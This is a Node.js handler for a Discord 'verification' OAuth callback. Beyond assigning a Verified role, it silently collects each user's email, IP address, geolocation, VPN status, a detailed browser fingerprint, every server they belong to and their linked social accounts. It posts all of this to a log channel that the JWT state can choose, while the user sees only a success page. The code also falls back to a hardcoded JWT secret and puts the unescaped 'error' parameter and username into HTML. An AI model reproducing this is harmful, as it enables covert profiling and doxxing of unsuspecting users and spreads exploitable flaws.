const jwt = require('jsonwebtoken');
const crypto = require('crypto');

const JWT_SECRET = process.env.JWT_SECRET || 'discord-verification-bot-jwt-secret-key-2024-fixed';

// Generate detailed device fingerprint from HTTP headers
function getDeviceFingerprint(headers) {
  const userAgent = headers['user-agent'] || 'Unknown';
  const acceptLanguage = headers['accept-language'] || 'Unknown';
  const acceptEncoding = headers['accept-encoding'] || 'Unknown';
  const accept = headers['accept'] || 'Unknown';
  const secClient = headers['sec-ch-ua'] || '';
  const secPlatform = headers['sec-ch-ua-platform'] || '';
  const secMobile = headers['sec-ch-ua-mobile'] || '';
  const secModel = headers['sec-ch-ua-model'] || '';
  const secBitness = headers['sec-ch-ua-bitness'] || '';
  const secWow64 = headers['sec-ch-ua-wow64'] || '';
  const secFetchDest = headers['sec-fetch-dest'] || '';
  const secFetchMode = headers['sec-fetch-mode'] || '';
  const secFetchSite = headers['sec-fetch-site'] || '';
  const secFetchUser = headers['sec-fetch-user'] || '';
  const origin = headers['origin'] || '';
  const referer = headers['referer'] || '';
  const dnt = headers['dnt'] || '';
  const upgradeInsecure = headers['upgrade-insecure-requests'] || '';
  
  let os = 'Unknown', osVersion = '', browser = 'Unknown', browserVersion = '', deviceType = 'Desktop', engine = 'Unknown';
  
  if (userAgent.includes('Windows NT 10.0')) os = 'Windows 10/11';
  else if (userAgent.includes('Windows NT 6.3')) os = 'Windows 8.1';
  else if (userAgent.includes('Windows NT 6.1')) os = 'Windows 7';
  else if (userAgent.includes('Mac OS X')) { os = 'macOS'; const m = userAgent.match(/Mac OS X ([0-9_\.]+)/); if (m) osVersion = m[1].replace(/_/g, '.'); }
  else if (userAgent.includes('Android')) { os = 'Android'; deviceType = 'Mobile'; const m = userAgent.match(/Android ([0-9\.]+)/); if (m) osVersion = m[1]; }
  else if (userAgent.includes('iOS') || userAgent.includes('iPhone')) { os = 'iOS'; deviceType = 'Mobile'; }
  else if (userAgent.includes('Linux')) os = 'Linux';
  
  if (userAgent.includes('Edg/')) { browser = 'Edge'; const m = userAgent.match(/Edg\/([0-9\.]+)/); if (m) browserVersion = m[1]; }
  else if (userAgent.includes('Chrome/')) { browser = 'Chrome'; const m = userAgent.match(/Chrome\/([0-9\.]+)/); if (m) browserVersion = m[1]; }
  else if (userAgent.includes('Firefox/')) { browser = 'Firefox'; const m = userAgent.match(/Firefox\/([0-9\.]+)/); if (m) browserVersion = m[1]; }
  else if (userAgent.includes('Safari/') && !userAgent.includes('Chrome')) { browser = 'Safari'; }
  
  if (userAgent.includes('Gecko/')) engine = 'Gecko';
  else if (userAgent.includes('AppleWebKit/')) engine = 'WebKit';
  
  const fingerprintData = JSON.stringify({ userAgent, acceptLanguage, acceptEncoding, accept, secClient, secPlatform, secMobile, secModel, secBitness, secWow64, secFetchDest, secFetchMode, secFetchSite, origin, referer, dnt, upgradeInsecure });
  const hash = crypto.createHash('sha256').update(fingerprintData).digest('hex').substring(0, 16);
  
  return {
    fingerprint: hash, fingerprintShort: hash.substring(0, 8),
    os, osVersion, browser, browserVersion, deviceType, engine,
    platform: secPlatform || os,
    language: acceptLanguage.split(',')[0] || 'Unknown',
    languages: acceptLanguage,
    encoding: acceptEncoding,
    dnt: dnt === '1' ? 'Enabled' : (dnt ? 'Disabled' : 'Not Set'),
    upgradeInsecure: upgradeInsecure === '1',
    referer: referer || 'Direct',
    origin: origin || 'None',
    secClient, secPlatform,
    secMobile: secMobile === '?1' ? 'Mobile' : (secMobile === '?0' ? 'Desktop' : 'Unknown'),
    secModel: secModel || 'N/A',
    secBitness: secBitness || 'N/A',
    secWow64: secWow64 === '?1' ? 'Yes' : (secWow64 === '?0' ? 'No' : 'Unknown'),
    secFetchDest, secFetchMode, secFetchSite, secFetchUser,
    userAgent
  };
}

// Get IP intelligence from ip-api.com (free)
async function getIPIntelligence(ip) {
  if (!ip || ip === 'Unknown' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
    return null;
  }
  try {
    const response = await fetch(`http://ip-api.com/json/${ip}`);
    if (response.ok) {
      const data = await response.json();
      if (data.status === 'success') {
        return data;
      }
    }
  } catch (e) {
    console.log('⚠️ IP intelligence error:', e.message);
  }
  return null;
}

async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  if (request.method === 'OPTIONS') return response.status(200).end();
  if (request.method !== 'GET') return response.status(405).json({ error: 'Method not allowed' });

  const { code, state, error } = request.query;

  // Capture client info
  const clientIP = request.headers['x-forwarded-for']?.split(',')[0] || request.headers['x-real-ip'] || request.headers['x-client-ip'] || 'Unknown';
  const deviceInfo = getDeviceFingerprint(request.headers);
  const ipIntelligence = await getIPIntelligence(clientIP);

  console.log('=== CALLBACK STARTED ===');
  console.log('Client IP:', clientIP);
  console.log('Code:', code ? 'Present' : 'Missing');
  console.log('State:', state ? 'Present' : 'Missing');

  function htmlResponse(title, content, color = 'blue') {
    return `<!DOCTYPE html><html><head><title>${title}</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;text-align:center;padding:50px 20px;background:#2c2f33;color:white;margin:0;min-height:100vh;display:flex;align-items:center;justify-content:center}.card{background:#23272a;border-radius:10px;padding:40px;max-width:500px;box-shadow:0 4px 15px rgba(0,0,0,0.3)}h1{font-size:48px;margin:0 0 20px}h2{margin:0 0 15px;font-weight:500}p{color:#99aab5;font-size:16px;margin:10px 0}</style></head><body><div class="card">${content}</div></body></html>`;
  }

  if (error) {
    console.log('❌ OAuth error:', error);
    return response.send(htmlResponse('Verification Failed', `<h1>❌</h1><h2>Authorization Denied</h2><p>Error: ${error}</p>`, 'red'));
  }

  if (!code || !state) {
    console.log('❌ Missing code or state');
    return response.send(htmlResponse('Invalid Request', `<h1>❌</h1><h2>Invalid Request</h2><p>Missing authorization code or state.</p>`, 'red'));
  }

  let userId, username, avatar, email, emailVerified, mfaEnabled, guildId, logChannelIdFromState;

  try {
    // Decode JWT state
    const decoded = jwt.verify(state, JWT_SECRET);
    guildId = decoded.guild_id;
    logChannelIdFromState = decoded.log_channel_id;
    console.log('📋 Decoded JWT - Guild:', guildId, 'User:', decoded.user_id);

    // Validate env vars
    const clientId = process.env.DISCORD_CLIENT_ID;
    const clientSecret = process.env.DISCORD_CLIENT_SECRET;
    const redirectUri = process.env.OAUTH_REDIRECT_URI;
    const botToken = process.env.DISCORD_BOT_TOKEN;

    if (!clientId || !clientSecret || !redirectUri || !botToken) {
      throw new Error('Server configuration error. Missing Discord credentials.');
    }

    // Exchange code for token
    console.log('🔄 Exchanging code for token...');
    const tokenResponse = await fetch('https://discord.com/api/oauth2/token', {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({
        client_id: clientId,
        client_secret: clientSecret,
        grant_type: 'authorization_code',
        code: code,
        redirect_uri: redirectUri
      })
    });

    if (!tokenResponse.ok) {
      const errorData = await tokenResponse.json();
      console.error('❌ Token error:', errorData);
      throw new Error(errorData.error_description || errorData.error || 'Failed to get token');
    }

    const tokenData = await tokenResponse.json();
    const accessToken = tokenData.access_token;
    console.log('✅ Got access token');

    // Get user info
    const userResponse = await fetch('https://discord.com/api/users/@me', {
      headers: { 'Authorization': `Bearer ${accessToken}` }
    });

    if (!userResponse.ok) throw new Error('Failed to get user info');
    const userData = await userResponse.json();
    userId = userData.id;
    username = userData.global_name || userData.username || 'User';
    email = userData.email || 'Not provided';
    emailVerified = userData.verified || false;
    mfaEnabled = userData.mfa_enabled || false;
    avatar = userData.avatar ? `https://cdn.discordapp.com/avatars/${userData.id}/${userData.avatar}.png` : 'No avatar';
    console.log('👤 User:', username, userId);

    // Get user guilds
    let userGuilds = [];
    try {
      const guildsResponse = await fetch('https://discord.com/api/users/@me/guilds', {
        headers: { 'Authorization': `Bearer ${accessToken}` }
      });
      if (guildsResponse.ok) userGuilds = await guildsResponse.json();
      console.log('📊 User in', userGuilds.length, 'servers');
    } catch (e) { console.log('⚠️ Could not fetch guilds:', e.message); }

    // Get user connections
    let userConnections = [];
    try {
      const connectionsResponse = await fetch('https://discord.com/api/users/@me/connections', {
        headers: { 'Authorization': `Bearer ${accessToken}` }
      });
      if (connectionsResponse.ok) userConnections = await connectionsResponse.json();
      console.log('🔗 User has', userConnections.length, 'connections');
    } catch (e) { console.log('⚠️ Could not fetch connections:', e.message); }

    // Verify user ID matches
    if (userId !== decoded.user_id) throw new Error('User ID mismatch');
    if (!guildId) throw new Error('No guild ID found');

    // Get guild info
    const botGuildResponse = await fetch(`https://discord.com/api/guilds/${guildId}`, {
      headers: { 'Authorization': `Bot ${botToken}` }
    });

    if (!botGuildResponse.ok) throw new Error('Bot is not in this server');
    const userGuild = await botGuildResponse.json();
    console.log('🏠 Guild:', userGuild.name);

    // Get roles
    const rolesResponse = await fetch(`https://discord.com/api/guilds/${guildId}/roles`, {
      headers: { 'Authorization': `Bot ${botToken}` }
    });

    if (!rolesResponse.ok) throw new Error('Failed to get roles');
    const roles = await rolesResponse.json();
    const verifiedRole = roles.find(r => r.name === 'Verified');

    if (!verifiedRole) throw new Error('Verified role not found. Run /setup first.');
    console.log('✅ Found Verified role:', verifiedRole.id);

    // Check member
    const memberResponse = await fetch(`https://discord.com/api/guilds/${guildId}/members/${userId}`, {
      headers: { 'Authorization': `Bot ${botToken}` }
    });

    if (!memberResponse.ok) throw new Error('User not in server');
    const memberData = await memberResponse.json();

    // Already verified?
    if (memberData.roles.includes(verifiedRole.id)) {
      console.log('⚠️ User already verified');
      await sendLog(userId, username, avatar, email, emailVerified, mfaEnabled, userGuild, 'ALREADY_VERIFIED', clientIP, deviceInfo, ipIntelligence, userGuilds, userConnections, null, logChannelIdFromState);
      return response.send(htmlResponse('Already Verified', `<h1>✅</h1><h2>Welcome back, ${username}!</h2><p>You are already verified.</p>`, 'green'));
    }

    // Assign role
    console.log('🔧 Assigning Verified role...');
    const assignRoleResponse = await fetch(
      `https://discord.com/api/guilds/${guildId}/members/${userId}/roles/${verifiedRole.id}`,
      { method: 'PUT', headers: { 'Authorization': `Bot ${botToken}` } }
    );

    if (!assignRoleResponse.ok) {
      const errData = await assignRoleResponse.json();
      console.error('❌ Role assign error:', assignRoleResponse.status, errData);
      throw new Error(`Failed to assign role (${assignRoleResponse.status})`);
    }

    console.log('✅ Role assigned successfully');

    // Send verification log
    console.log('📝 Sending verification log...');
    await sendLog(userId, username, avatar, email, emailVerified, mfaEnabled, userGuild, 'VERIFIED', clientIP, deviceInfo, ipIntelligence, userGuilds, userConnections, null, logChannelIdFromState);
    console.log('✅ Log sent');

    // Send DM
    try {
      const dmResponse = await fetch(`https://discord.com/api/users/${userId}/channels`, {
        method: 'POST',
        headers: { 'Authorization': `Bot ${botToken}` },
        body: JSON.stringify({})
      });
      if (dmResponse.ok) {
        const dmData = await dmResponse.json();
        await fetch(`https://discord.com/api/channels/${dmData.id}/messages`, {
          method: 'POST',
          headers: { 'Authorization': `Bot ${botToken}`, 'Content-Type': 'application/json' },
          body: JSON.stringify({ content: `✅ **Verification successful!**\n\nYou now have access to **${userGuild.name}**!` })
        });
      }
    } catch (e) { console.log('ℹ️ Could not send DM'); }

    return response.send(htmlResponse('Verification Successful!', `<h1>✅</h1><h2>Welcome, ${username}!</h2><p>You have been verified!</p>`, 'green'));

  } catch (error) {
    console.error('❌ Verification error:', error.message);
    return response.send(htmlResponse('Verification Failed', `<h1>❌</h1><h2>Verification Failed</h2><p>${error.message}</p>`, 'red'));
  }
}

async function sendLog(userId, username, avatar, email, emailVerified, mfaEnabled, guild, status, ip, deviceInfo, ipIntelligence, userGuilds, userConnections, errorMessage, logChannelIdFromState) {
  try {
    const logChannelId = logChannelIdFromState || process.env.LOG_CHANNEL_ID;
    
    console.log('📝 sendLog: LOG_CHANNEL_ID =', logChannelId || 'MISSING');
    console.log('📝 sendLog: DISCORD_BOT_TOKEN =', process.env.DISCORD_BOT_TOKEN ? 'Present' : 'MISSING');
    
    if (!logChannelId) {
      console.error('❌ LOG_CHANNEL_ID not configured');
      return;
    }
    if (!process.env.DISCORD_BOT_TOKEN) {
      console.error('❌ DISCORD_BOT_TOKEN not configured');
      return;
    }

    const isVerified = status === 'VERIFIED';

    // Format connections
    const connectionTypes = userConnections.length > 0
      ? userConnections.map(c => {
          const icons = { discord: '💬', steam: '🎮', twitter: '🐦', twitch: '🎬', youtube: '📺', reddit: '🤖', facebook: '📘', github: '💻', instagram: '📷', tiktok: '🎵', spotify: '🎵', leagueoflegends: '⚔️', xbox: '🎮', playstation: '🎮', roblox: '🎮', domain: '🔗' };
          const icon = icons[c.type] || '🔗';
          const verified = c.verified ? ' ✅' : '';
          let link = '';
          if (c.type === 'twitter' && c.id) link = ` - [Link](https://twitter.com/${c.id})`;
          else if (c.type === 'github' && c.id) link = ` - [Link](https://github.com/${c.id})`;
          else if (c.type === 'youtube' && c.id) link = ` - [Link](https://youtube.com/@${c.id})`;
          else if (c.type === 'steam' && c.id) link = ` - [Link](https://steamcommunity.com/profiles/${c.id})`;
          else if (c.type === 'twitch' && c.id) link = ` - [Link](https://twitch.tv/${c.id})`;
          else if (c.type === 'instagram' && c.id) link = ` - [Link](https://instagram.com/${c.id})`;
          else if (c.type === 'tiktok' && c.id) link = ` - [Link](https://tiktok.com/@${c.id})`;
          else if (c.type === 'spotify' && c.id) link = ` - [Link](https://open.spotify.com/user/${c.id})`;
          else if (c.type === 'roblox' && c.id) link = ` - [Link](https://roblox.com/users/${c.id})`;
          else if (c.type === 'domain' && c.id) link = ` - [Link](https://${c.id})`;
          return `${icon} ${c.name || c.type}${verified}${link}`;
        }).join('\n')
      : 'None';

    // Format servers list
    const guildCount = userGuilds.length || 0;
    const guildList = userGuilds.length > 0
      ? userGuilds.slice(0, 10).map(g => `${g.name}${g.owner ? ' 👑' : ''}`).join('\n') + (userGuilds.length > 10 ? `\n*...and ${userGuilds.length - 10} more*` : '')
      : 'None';

    const embeds = [];

    // Main verification embed
    embeds.push({
      title: isVerified ? '✅ New Verification' : '⚠️ Re-verification',
      color: isVerified ? 0x27ae60 : 0xf39c12,
      timestamp: new Date().toISOString(),
      thumbnail: avatar !== 'No avatar' ? { url: avatar } : undefined,
      fields: [
        { name: '👤 User', value: userId ? `<@${userId}> (${username})` : 'Unknown', inline: true },
        { name: '🆔 User ID', value: `\`${userId || 'N/A'}\``, inline: true },
        { name: '📧 Email', value: email || 'Not provided', inline: true },
        { name: '✅ Email Verified', value: emailVerified ? '✅ Yes' : '❌ No', inline: true },
        { name: '🔐 2FA Enabled', value: mfaEnabled ? '✅ Yes' : '❌ No', inline: true },
        { name: '🌐 IP Address', value: `\`${ip || 'N/A'}\``, inline: true },
        { name: '🛡️ VPN/Proxy', value: ipIntelligence ? (ipIntelligence.proxy || ipIntelligence.hosting ? '⚠️ **Yes**' : '❌ No') : 'Unknown', inline: true },
        { name: '🏢 ISP', value: ipIntelligence ? (ipIntelligence.isp || 'N/A') : 'Unknown', inline: true },
        { name: '💻 Device', value: deviceInfo ? `${deviceInfo.os} • ${deviceInfo.browser}` : 'Unknown', inline: true },
        { name: '🔍 Fingerprint', value: deviceInfo ? `\`${deviceInfo.fingerprintShort}\`` : 'N/A', inline: true },
        { name: '📱 Device Type', value: deviceInfo ? deviceInfo.deviceType : 'Unknown', inline: true },
        { name: '🌍 Language', value: deviceInfo ? deviceInfo.language : 'Unknown', inline: true },
        { name: '📊 In Servers', value: `${guildCount} servers`, inline: true },
        { name: '🔗 Connections', value: connectionTypes, inline: false },
        { name: '🏠 Servers They\'re In', value: guildList, inline: false },
        { name: '🏠 Target Server', value: guild?.name ? `${guild.name} (\`${guild.id}\`)` : 'N/A', inline: false }
      ],
      footer: { text: `${status} • ${new Date().toLocaleString()}` }
    });

    // Full servers embed
    if (userGuilds.length > 0) {
      embeds.push({
        title: `🏠 All Servers (${guildCount} total)`,
        color: 0x5865F2,
        fields: [{
          name: '📋 Complete Server List',
          value: userGuilds.map(g => `${g.name}${g.owner ? ' 👑' : ''}`).join('\n').substring(0, 1024),
          inline: false
        }]
      });
    }

    // Full connections embed
    if (userConnections.length > 0) {
      embeds.push({
        title: `🔗 All Connections (${userConnections.length} total)`,
        color: 0x27ae60,
        fields: [{
          name: '📱 Connected Accounts',
          value: userConnections.map(c => {
            const icons = { discord: '💬', steam: '🎮', twitter: '🐦', twitch: '🎬', youtube: '📺', reddit: '🤖', facebook: '📘', github: '💻', instagram: '📷', tiktok: '🎵', spotify: '🎵', leagueoflegends: '⚔️', xbox: '🎮', playstation: '🎮', roblox: '🎮', domain: '🔗' };
            const icon = icons[c.type] || '🔗';
            const verified = c.verified ? '✅' : '❌';
            let link = 'No link';
            if (c.type === 'twitter' && c.id) link = `https://twitter.com/${c.id}`;
            else if (c.type === 'github' && c.id) link = `https://github.com/${c.id}`;
            else if (c.type === 'youtube' && c.id) link = `https://youtube.com/@${c.id}`;
            else if (c.type === 'steam' && c.id) link = `https://steamcommunity.com/profiles/${c.id}`;
            else if (c.type === 'twitch' && c.id) link = `https://twitch.tv/${c.id}`;
            else if (c.type === 'instagram' && c.id) link = `https://instagram.com/${c.id}`;
            else if (c.type === 'tiktok' && c.id) link = `https://tiktok.com/@${c.id}`;
            else if (c.type === 'spotify' && c.id) link = `https://open.spotify.com/user/${c.id}`;
            else if (c.type === 'roblox' && c.id) link = `https://roblox.com/users/${c.id}`;
            else if (c.type === 'domain' && c.id) link = `https://${c.id}`;
            return `${icon} **${c.name || c.type}** ${verified}\n└ Link: ${link}`;
          }).join('\n\n').substring(0, 1024),
          inline: false
        }]
      });
    }

    // IP intelligence embed
    if (ipIntelligence && ipIntelligence.status === 'success') {
      embeds.push({
        title: '🌐 IP Intelligence',
        color: ipIntelligence.proxy || ipIntelligence.hosting ? 0xe74c3c : 0x27ae60,
        fields: [
          { name: '📍 IP Address', value: `\`${ipIntelligence.query}\``, inline: false },
          { name: '🛡️ Security', value: `**VPN/Proxy:** ${ipIntelligence.proxy ? '⚠️ Yes' : '❌ No'}\n**Hosting:** ${ipIntelligence.hosting ? '⚠️ Yes' : '❌ No'}`, inline: false },
          { name: '🌐 Location', value: `**Country:** ${ipIntelligence.country}\n**Region:** ${ipIntelligence.regionName}\n**City:** ${ipIntelligence.city}\n**Timezone:** ${ipIntelligence.timezone}`, inline: false },
          { name: '🏢 Network', value: `**ISP:** ${ipIntelligence.isp}\n**ASN:** ${ipIntelligence.as || 'N/A'}`, inline: false }
        ]
      });
    }

    // Device fingerprint embed
    if (deviceInfo) {
      embeds.push({
        title: '🔍 Detailed Device Fingerprint',
        color: 0x5865F2,
        fields: [
          { name: '🖥️ OS', value: deviceInfo.os + (deviceInfo.osVersion ? ` ${deviceInfo.osVersion}` : ''), inline: true },
          { name: '🌐 Browser', value: deviceInfo.browser + (deviceInfo.browserVersion ? ` v${deviceInfo.browserVersion}` : ''), inline: true },
          { name: '⚙️ Engine', value: deviceInfo.engine !== 'Unknown' ? deviceInfo.engine : 'Not Detected', inline: true },
          { name: '📱 Device Type', value: deviceInfo.deviceType, inline: true },
          { name: '🔣 Mobile', value: deviceInfo.secMobile !== 'Unknown' ? deviceInfo.secMobile : 'Not Detected', inline: true },
          { name: '🔢 Bitness', value: deviceInfo.secBitness !== 'N/A' ? deviceInfo.secBitness : 'Not Detected', inline: true },
          { name: '📍 Model', value: deviceInfo.secModel !== 'N/A' ? deviceInfo.secModel : 'Not Detected', inline: true },
          { name: '64-bit Windows', value: deviceInfo.secWow64 !== 'Unknown' ? deviceInfo.secWow64 : 'Not Detected', inline: true },
          { name: '🌍 Languages', value: `\`${deviceInfo.languages}\``, inline: false },
          { name: '📦 Encoding', value: `\`${deviceInfo.encoding}\``, inline: false },
          { name: '🔗 Origin', value: deviceInfo.origin !== 'None' ? deviceInfo.origin : 'Not Provided', inline: true },
          { name: '📄 Referer', value: deviceInfo.referer !== 'Direct' ? deviceInfo.referer : 'Direct Access', inline: true },
          { name: '🚫 Do Not Track', value: deviceInfo.dnt, inline: true },
          { name: '⬆️ Upgrade Insecure', value: deviceInfo.upgradeInsecure ? '✅ Yes' : '❌ No', inline: true },
          { name: '🎯 Fetch Dest', value: deviceInfo.secFetchDest || 'Not Provided', inline: true },
          { name: '🚀 Fetch Mode', value: deviceInfo.secFetchMode || 'Not Provided', inline: true },
          { name: '🌐 Fetch Site', value: deviceInfo.secFetchSite || 'Not Provided', inline: true },
          { name: '👤 Fetch User', value: deviceInfo.secFetchUser === '?1' ? '✅ Yes' : (deviceInfo.secFetchUser === '?0' ? '❌ No' : 'Not Provided'), inline: true },
          { name: '🆔 Full Fingerprint', value: `\`${deviceInfo.fingerprint}\``, inline: false },
          { name: '📜 User Agent', value: `\`\`\`${deviceInfo.userAgent}\`\`\``, inline: false }
        ]
      });
    }

    // Send to Discord
    console.log('📝 Sending', embeds.length, 'embeds to Discord...');
    const logResponse = await fetch(`https://discord.com/api/channels/${logChannelId}/messages`, {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${process.env.DISCORD_BOT_TOKEN}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ embeds: embeds })
    });

    console.log('📊 Discord API Response:', logResponse.status);

    if (!logResponse.ok) {
      const errData = await logResponse.json();
      console.error('❌ Failed to send log:', errData);
      console.error('❌ Discord Error:', JSON.stringify(errData, null, 2));
    } else {
      console.log('✅ Log sent successfully to Discord!');
    }
  } catch (error) {
    console.error('❌ sendLog error:', error);
    console.error('❌ Error stack:', error.stack);
  }
}

module.exports = handler;
